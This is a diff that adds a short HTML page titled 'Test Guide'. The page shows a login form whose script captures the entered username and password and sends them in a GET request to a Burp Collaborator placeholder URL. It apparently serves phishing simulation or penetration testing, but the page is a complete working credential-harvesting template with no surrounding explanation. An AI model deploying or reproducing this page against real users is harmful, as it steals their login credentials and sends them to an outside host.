@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Guide</title>
+    <script type="text/javascript">
+        function sendData() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            
+            // Send the captured data to Burp Collaborator via HTTP GET request
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "http://<BURP_COLLABORATOR_URL>/?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password), true);
+            xhr.send();
+        }
+    </script>
+</head>
+<body>
+    <h2>Login</h2>
+    <form onsubmit="event.preventDefault(); sendData();">
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username" required><br><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
